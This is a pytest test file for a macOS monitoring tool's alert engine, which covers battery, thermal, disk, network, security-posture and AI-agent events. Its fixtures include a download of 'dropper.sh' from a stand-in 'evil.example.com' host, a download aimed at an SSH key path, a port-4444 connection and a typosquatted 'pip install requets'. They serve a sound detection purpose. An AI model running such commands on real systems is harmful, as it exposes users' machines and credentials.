"""Tests for AlertEngine logic."""
import pytest
from datetime import datetime, timedelta

from sentinel_mac.core import (
    DEFAULT_CONFIG,
    SystemMetrics,
    Alert,
    AlertEngine,
)
from sentinel_mac.models import SecurityEvent


def make_metrics(**kwargs):
    """Create a SystemMetrics with sensible defaults."""
    defaults = {
        "timestamp": datetime.now(),
        "cpu_percent": 20.0,
        "memory_percent": 50.0,
        "memory_used_gb": 8.0,
        "battery_percent": 80.0,
        "battery_plugged": True,
        "disk_percent": 50.0,
        "disk_free_gb": 200.0,
        "net_sent_mb": 0.5,
        "net_recv_mb": 1.0,
        "firewall_enabled": True,
        "gatekeeper_enabled": True,
        "filevault_enabled": True,
        "ai_processes": [],
        "ai_cpu_total": 0.0,
        "ai_memory_total_mb": 0.0,
    }
    defaults.update(kwargs)
    return SystemMetrics(**defaults)


class TestBatteryAlerts:
    """Tests for battery-related alerts."""

    def setup_method(self):
        self.engine = AlertEngine(DEFAULT_CONFIG)

    def test_no_alert_when_plugged(self):
        m = make_metrics(battery_percent=5.0, battery_plugged=True)
        alerts = self.engine.evaluate(m)
        battery_alerts = [a for a in alerts if "battery" in a.category]
        assert len(battery_alerts) == 0

    def test_critical_battery(self):
        m = make_metrics(battery_percent=8.0, battery_plugged=False)
        alerts = self.engine.evaluate(m)
        assert any(a.category == "battery_critical" for a in alerts)

    def test_warning_battery(self):
        m = make_metrics(battery_percent=15.0, battery_plugged=False)
        alerts = self.engine.evaluate(m)
        assert any(a.category == "battery_warning" for a in alerts)

    def test_no_battery_alert_above_threshold(self):
        m = make_metrics(battery_percent=50.0, battery_plugged=False)
        alerts = self.engine.evaluate(m)
        battery_alerts = [a for a in alerts if "battery" in a.category]
        assert len(battery_alerts) == 0

    def test_drain_rate_detection(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        now = datetime.now()
        # Feed history: 80% -> 70% -> 60% in 10 minutes = 120%/hr
        for i, pct in enumerate([80.0, 70.0, 60.0]):
            m = make_metrics(
                timestamp=now + timedelta(minutes=i * 5),
                battery_percent=pct,
                battery_plugged=False,
            )
            alerts = engine.evaluate(m)

        drain_alerts = [a for a in alerts if a.category == "battery_drain"]
        assert len(drain_alerts) == 1

    def test_no_drain_alert_when_none_battery(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        now = datetime.now()
        for i in range(3):
            m = make_metrics(
                timestamp=now + timedelta(minutes=i * 5),
                battery_percent=None,
                battery_plugged=True,
            )
            alerts = engine.evaluate(m)
        drain_alerts = [a for a in alerts if a.category == "battery_drain"]
        assert len(drain_alerts) == 0


class TestThermalAlerts:
    """Tests for thermal alerts."""

    def setup_method(self):
        self.engine = AlertEngine(DEFAULT_CONFIG)

    def test_critical_temp(self):
        m = make_metrics(cpu_temp=96.0)
        alerts = self.engine.evaluate(m)
        assert any(a.category == "temp_critical" for a in alerts)

    def test_warning_temp(self):
        m = make_metrics(cpu_temp=88.0)
        alerts = self.engine.evaluate(m)
        assert any(a.category == "temp_warning" for a in alerts)

    def test_thermal_pressure_alert(self):
        m = make_metrics(cpu_temp=None, thermal_pressure="critical")
        alerts = self.engine.evaluate(m)
        assert any(a.category == "thermal_pressure" for a in alerts)

    def test_no_alert_nominal(self):
        m = make_metrics(cpu_temp=60.0, thermal_pressure="nominal")
        alerts = self.engine.evaluate(m)
        thermal = [a for a in alerts if "temp" in a.category or "thermal" in a.category]
        assert len(thermal) == 0


class TestMemoryAlerts:

    def test_memory_critical(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(memory_percent=92.0)
        alerts = engine.evaluate(m)
        assert any(a.category == "memory_high" for a in alerts)

    def test_no_alert_below_threshold(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(memory_percent=70.0)
        alerts = engine.evaluate(m)
        assert not any(a.category == "memory_high" for a in alerts)


class TestSecurityAlerts:

    def test_security_alert_when_firewall_disabled(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(firewall_enabled=False)
        alerts = engine.evaluate(m)
        sec = [a for a in alerts if a.category == "security_posture"]
        assert len(sec) == 1
        assert "Firewall" in sec[0].message

    def test_security_alert_lists_multiple_controls(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(
            firewall_enabled=False,
            gatekeeper_enabled=False,
            filevault_enabled=False,
        )
        alerts = engine.evaluate(m)
        sec = [a for a in alerts if a.category == "security_posture"]
        assert len(sec) == 1
        assert "Firewall" in sec[0].message
        assert "Gatekeeper" in sec[0].message
        assert "FileVault" in sec[0].message

    def test_no_security_alert_when_controls_enabled(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(
            firewall_enabled=True,
            gatekeeper_enabled=True,
            filevault_enabled=True,
        )
        alerts = engine.evaluate(m)
        assert not any(a.category == "security_posture" for a in alerts)

    def test_no_security_alert_when_state_unknown(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(
            firewall_enabled=None,
            gatekeeper_enabled=None,
            filevault_enabled=None,
        )
        alerts = engine.evaluate(m)
        assert not any(a.category == "security_posture" for a in alerts)


class TestDiskAlerts:

    def test_disk_critical(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(disk_percent=95.0, disk_free_gb=10.0)
        alerts = engine.evaluate(m)
        assert any(a.category == "disk_high" for a in alerts)

    def test_no_alert_below_threshold(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(disk_percent=50.0)
        alerts = engine.evaluate(m)
        assert not any(a.category == "disk_high" for a in alerts)


class TestNetworkAlerts:

    def test_network_spike(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(net_sent_mb=60.0, net_recv_mb=60.0)
        alerts = engine.evaluate(m)
        assert any(a.category == "network_spike" for a in alerts)

    def test_no_spike_normal_traffic(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(net_sent_mb=1.0, net_recv_mb=2.0)
        alerts = engine.evaluate(m)
        assert not any(a.category == "network_spike" for a in alerts)


class TestSessionAlerts:

    def test_session_end_alert(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        now = datetime.now()
        ai_procs = [{"pid": 1, "name": "ollama", "cpu": 50.0, "mem_mb": 1000}]

        # Start session
        m1 = make_metrics(timestamp=now, ai_processes=ai_procs, ai_cpu_total=50.0)
        engine.evaluate(m1)

        # End session after 10 minutes
        m2 = make_metrics(timestamp=now + timedelta(minutes=10), ai_processes=[])
        alerts = engine.evaluate(m2)
        assert any(a.category == "session_end" for a in alerts)


class TestNightWatch:

    def test_night_watch_triggered(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        ai_procs = [{"pid": 1, "name": "ollama", "cpu": 50.0, "mem_mb": 1000}]
        night = datetime.now().replace(hour=3, minute=0)
        m = make_metrics(
            timestamp=night,
            battery_percent=40.0,
            battery_plugged=False,
            ai_processes=ai_procs,
            ai_cpu_total=50.0,
        )
        alerts = engine.evaluate(m)
        assert any(a.category == "night_watch" for a in alerts)

    def test_no_night_watch_during_day(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        ai_procs = [{"pid": 1, "name": "ollama", "cpu": 50.0, "mem_mb": 1000}]
        day = datetime.now().replace(hour=14, minute=0)
        m = make_metrics(
            timestamp=day,
            battery_percent=40.0,
            battery_plugged=False,
            ai_processes=ai_procs,
            ai_cpu_total=50.0,
        )
        alerts = engine.evaluate(m)
        assert not any(a.category == "night_watch" for a in alerts)


class TestCooldowns:

    def test_duplicate_alert_suppressed(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        m = make_metrics(memory_percent=95.0)
        alerts1 = engine.evaluate(m)
        alerts2 = engine.evaluate(m)
        mem1 = [a for a in alerts1 if a.category == "memory_high"]
        mem2 = [a for a in alerts2 if a.category == "memory_high"]
        assert len(mem1) == 1
        assert len(mem2) == 0  # Suppressed by cooldown

    def test_critical_has_shorter_cooldown(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        # Default cooldown = 10 min, critical = max(2, 10//3) = 3 min
        m = make_metrics(battery_percent=5.0, battery_plugged=False)
        alerts1 = engine.evaluate(m)
        assert any(a.category == "battery_critical" for a in alerts1)

        # 4 minutes later — should fire again for critical (cooldown=3min)
        m2 = make_metrics(
            timestamp=datetime.now() + timedelta(minutes=4),
            battery_percent=4.0,
            battery_plugged=False,
        )
        alerts2 = engine.evaluate(m2)
        assert any(a.category == "battery_critical" for a in alerts2)


# ─── Host-trust downgrade (ADR 0001) ───


class TestTrustDowngrade:
    """AlertEngine.evaluate_security_event applies host-trust downgrade."""

    def setup_method(self):
        self.engine = AlertEngine(DEFAULT_CONFIG)

    def _net_event(self, **detail_overrides):
        detail = {
            "remote_ip": "5.6.7.8",
            "remote_port": 443,
            "hostname": "evil.example.com",
            "allowed": False,
            "nonstandard_port": False,
        }
        detail.update(detail_overrides)
        return SecurityEvent(
            timestamp=datetime.now(),
            source="net_tracker",
            actor_pid=1234,
            actor_name="ollama",
            event_type="net_connect",
            target="evil.example.com:443",
            detail=detail,
        )

    def test_downgrade_warning_to_info(self):
        """warning + downgrade=True → info."""
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event(trust_level="known", downgrade=True)
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "info"

    def test_downgrade_critical_to_warning(self):
        """critical + downgrade=True → warning."""
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event(
            remote_port=4444,
            nonstandard_port=True,
            trust_level="learned",
            downgrade=True,
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "warning"

    def test_blocked_trust_ignores_downgrade_flag(self):
        """trust=blocked overrides downgrade=True (defense in depth)."""
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event(
            remote_port=4444,
            nonstandard_port=True,
            trust_level="blocked",
            downgrade=True,
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "critical"

    def test_no_downgrade_field_no_change(self):
        """Events without downgrade fields behave exactly as before."""
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event()  # no trust_level / downgrade
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "warning"

    def test_downgrade_false_no_change(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event(trust_level="unknown", downgrade=False)
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "warning"

    def test_info_stays_info_under_downgrade(self):
        """info is already minimum — downgrade is a no-op, not an error."""
        engine = AlertEngine(DEFAULT_CONFIG)
        event = self._net_event(
            remote_port=9999,
            allowed=True,
            nonstandard_port=True,
            trust_level="known",
            downgrade=True,
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "info"


# ─── agent_download dispatch (ADR 0002 §D5) ───


class TestAgentDownloadAlerts:
    """AlertEngine routes agent_download events to user-facing alerts.

    Regression coverage for PR #12 follow-up: the parser already sets
    risk_score (0.9 / 0.5 / 0.2) per the §D5 matrix; the engine MUST map
    that score to a critical / warning / info Alert so the macOS
    notification channel actually fires. Before the fix, agent_download
    events landed in JSONL + --report only, never reaching the user.
    """

    def _make_engine(self):
        return AlertEngine(DEFAULT_CONFIG)

    def _download_event(self, *, risk_score, **detail_overrides):
        detail = {
            "source_url": "https://example.com/payload.tar.gz",
            "output_path": "/tmp/payload.tar.gz",
            "downloader": "curl",
            "command": "curl -L https://example.com/payload.tar.gz -o /tmp/payload.tar.gz",
            "high_risk": risk_score >= 0.5,
            "trust_level": "unknown",
            "joined_fs_event": None,
        }
        detail.update(detail_overrides)
        return SecurityEvent(
            timestamp=datetime.now(),
            source="agent_log",
            actor_pid=0,
            actor_name="claude_code",
            event_type="agent_download",
            target=detail["source_url"],
            detail=detail,
            risk_score=risk_score,
        )

    def test_agent_download_critical_for_sensitive_path(self):
        """risk_score=0.9 (sensitive path) → critical alert."""
        engine = self._make_engine()
        event = self._download_event(
            risk_score=0.9,
            output_path="/Users/me/.ssh/id_rsa",
            trust_level="known",
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "critical"
        assert alerts[0].category == "agent_download_sensitive"

    def test_agent_download_warning_for_untrusted_host(self):
        """risk_score=0.5 (BLOCKED or UNKNOWN host) → warning alert."""
        engine = self._make_engine()
        event = self._download_event(
            risk_score=0.5,
            trust_level="unknown",
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "warning"
        assert alerts[0].category == "agent_download_untrusted"

    def test_agent_download_info_for_trusted(self):
        """risk_score=0.2 (KNOWN/LEARNED host) → info alert."""
        engine = self._make_engine()
        event = self._download_event(
            risk_score=0.2,
            trust_level="known",
            high_risk=False,
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        assert alerts[0].level == "info"
        assert alerts[0].category == "agent_download"

    def test_agent_download_alert_message_includes_url_and_path(self):
        """Forensic info (source_url + output_path) preserved in user alert."""
        engine = self._make_engine()
        event = self._download_event(
            risk_score=0.5,
            source_url="https://evil.example.com/dropper.sh",
            output_path="/tmp/dropper.sh",
            downloader="wget",
            trust_level="unknown",
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        msg = alerts[0].message
        assert "https://evil.example.com/dropper.sh" in msg
        assert "/tmp/dropper.sh" in msg
        assert "wget" in msg


# ─── ADR 0007 D6 — [ctx] block formatting ─────────────────────────


class TestCtxBlockFormatting:
    """Direct unit tests for ``_format_ctx_block`` covering every path."""

    def test_returns_empty_when_both_session_and_project_null(self):
        from sentinel_mac.engine import _format_ctx_block
        assert _format_ctx_block({}) == ""
        assert _format_ctx_block({
            "session": None, "project_meta": None,
        }) == ""
        assert _format_ctx_block({
            "session": {"id": None, "model": None, "version": None, "cwd": None},
            "project_meta": None,
        }) == ""

    def test_project_only_emits_project_line(self):
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "project_meta": {
                "name": "myproj", "root": "/x",
                "git": {"branch": "main", "head": "abc12345", "remote": "foo/bar"},
            },
        })
        assert "Project: myproj (main @ abc12345)" in block
        # D7 — git.remote MUST NOT appear in user-visible message.
        assert "foo/bar" not in block

    def test_session_only_emits_session_and_where_lines(self):
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "session": {
                "id": "abc-uuid-12345678",
                "model": "claude-opus-4-7",
                "version": "2.1.123",
                "cwd": "/tmp/somewhere",
            },
        })
        assert "Session: claude-opus-4-7 #abc-uuid (CC 2.1.123)" in block
        assert "Where:   /tmp/somewhere" in block
        # No project_meta in detail → no Project: line.
        assert "Project:" not in block

    def test_all_four_lines_render(self):
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "session": {
                "id": "abc-uuid-12345678",
                "model": "claude-opus-4-7",
                "version": "2.1.123",
                "cwd": "/tmp/somewhere",
            },
            "project_meta": {
                "name": "myproj", "root": "/x",
                "git": {"branch": "main", "head": "abc12345"},
            },
            "command": "pip install requets",
        })
        lines = block.strip().splitlines()
        assert len(lines) == 4
        assert lines[0].strip().startswith("Project:")
        assert lines[1].strip().startswith("Session:")
        assert lines[2].strip().startswith("Where:")
        assert lines[3].strip().startswith("What:")

    def test_cwd_under_home_uses_tilde(self):
        from sentinel_mac.engine import _format_ctx_block
        from pathlib import Path
        home = str(Path.home())
        block = _format_ctx_block({
            "session": {
                "id": "abc", "model": "m", "version": "v",
                "cwd": home + "/some/sub",
            },
        })
        assert "Where:   ~/some/sub" in block
        assert home not in block

    def test_long_command_truncated_with_ellipsis(self):
        from sentinel_mac.engine import _format_ctx_block
        long_cmd = "x" * 200
        block = _format_ctx_block({"command": long_cmd})
        # 80-char cap with `…` suffix per D6 macOS-tightened rule.
        what_line = [
            ln for ln in block.splitlines() if ln.strip().startswith("What:")
        ][0]
        # Strip indent + "What:    " prefix.
        rendered = what_line.split("What:", 1)[1].strip()
        assert len(rendered) == 80
        assert rendered.endswith("…")

    def test_branch_only_no_head(self):
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "project_meta": {
                "name": "myproj",
                "git": {"branch": "main", "head": None},
            },
        })
        assert "Project: myproj (main)" in block
        assert "@" not in block.split("Project:")[1].split("\n")[0]

    def test_no_git_just_name(self):
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "project_meta": {"name": "myproj", "git": None},
        })
        assert "Project: myproj" in block
        assert "(" not in block.split("Project:")[1].split("\n")[0]

    def test_remote_omitted_from_user_visible_block(self):
        """ADR 0007 D7 privacy boundary — git.remote stays in audit log
        only and MUST NEVER surface in the rendered alert text."""
        from sentinel_mac.engine import _format_ctx_block
        block = _format_ctx_block({
            "project_meta": {
                "name": "secret-proj",
                "git": {
                    "branch": "main", "head": "deadbeef",
                    "remote": "owner/private-repo",
                },
            },
        })
        assert "owner/private-repo" not in block
        assert "remote" not in block.lower()


class TestAlertMessageWithCtxBlock:
    """End-to-end — the engine's evaluate_security_event appends the
    [ctx] block to every Alert it produces from a SecurityEvent."""

    def test_typosquatting_alert_carries_ctx_block(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        event = SecurityEvent(
            timestamp=datetime.now(),
            source="agent_log",
            actor_pid=0,
            actor_name="claude_code",
            event_type="typosquatting_suspect",
            target="requets",
            detail={
                "command": "pip install requets",
                "ecosystem": "pip",
                "similar_to": "requests",
                "confidence": "high",
                "session": {
                    "id": "abc-uuid-12345678",
                    "model": "claude-opus-4-7",
                    "version": "2.1.123",
                    "cwd": "/Users/x/proj",
                },
                "project_meta": {
                    "name": "myproj", "root": "/Users/x/proj",
                    "git": {"branch": "main", "head": "abc12345"},
                },
            },
        )
        alerts = engine.evaluate_security_event(event)
        assert len(alerts) == 1
        msg = alerts[0].message
        # Existing alert text preserved (regression: substring check).
        assert "requets" in msg
        assert "requests" in msg
        # New [ctx] block appended.
        assert "Project: myproj (main @ abc12345)" in msg
        assert "Session: claude-opus-4-7" in msg
        assert "What:    pip install requets" in msg

    def test_alert_unchanged_when_ctx_fields_empty(self):
        engine = AlertEngine(DEFAULT_CONFIG)
        # Same event minus session + project_meta — alert must not gain
        # a [ctx] block, only the original text.
        event = SecurityEvent(
            timestamp=datetime.now(),
            source="agent_log",
            actor_pid=0,
            actor_name="claude_code",
            event_type="typosquatting_suspect",
            target="requets",
            detail={
                "command": "pip install requets",
                "ecosystem": "pip",
                "similar_to": "requests",
                "confidence": "high",
            },
        )
        alerts = engine.evaluate_security_event(event)
        msg = alerts[0].message
        # `command` alone produces a What: line (it's still in detail).
        assert "What:    pip install requets" in msg
        # But neither Project: nor Session: line.
        assert "Project:" not in msg
        assert "Session:" not in msg

